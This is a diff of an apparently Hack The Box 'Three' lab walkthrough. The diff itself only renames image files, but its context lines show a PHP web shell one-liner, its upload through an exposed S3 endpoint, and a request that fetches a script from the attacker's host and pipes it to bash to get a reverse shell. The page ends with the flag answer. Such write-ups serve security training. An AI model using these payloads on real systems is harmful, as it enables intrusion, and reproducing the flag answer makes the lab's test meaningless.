@@ -53,7 +53,7 @@ Answer: 2
 
 We see port 80 open on the target, when browsing the website of the target, going to Contact we see the email address.
 
-<figure><img src="../../../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (105) (2).png" alt=""><figcaption></figcaption></figure>
 
 Answer: thetoppers.htb
 
@@ -71,7 +71,7 @@ Answer: /etc/hosts
 
 After editing the host file to map the IP to the domain, we can use Gobuster to help enumerate the site.
 
-<figure><img src="../../../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (102) (2).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../../../.gitbook/assets/image (10) (2).png" alt=""><figcaption></figcaption></figure>
 
@@ -123,7 +123,7 @@ Looking at the buckets with: `aws --endpoint=http://s3.thetoppers.htb s3 ls`
 
 we can go into this further: `aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`
 
-<figure><img src="../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (4) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 With this basic info we can see this would use PHP
 
@@ -141,7 +141,7 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 
 With the shell file created, we can use `cp` to get the file onto the server and run CMD.
 
-<figure><img src="../../../../.gitbook/assets/image (6) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (6) (2).png" alt=""><figcaption></figcaption></figure>
 
 Confirm that our shell is uploaded by navigating to http://thetoppers.htb/shell.php.
 
@@ -170,10 +170,10 @@ http://thetoppers.htb/shell.php?cmd=curl%20%3C10.10.14.119%3E:8081/shell.sh|bash
 
 We now can see our reverse shell:
 
-<figure><img src="../../../../.gitbook/assets/image (2) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (2) (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 Now we can locate the flag and cat it's contents
 
-<figure><img src="../../../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (106) (2).png" alt=""><figcaption></figcaption></figure>
 
 Answer: a980d99281a28d638ac68b9bf9453c2b
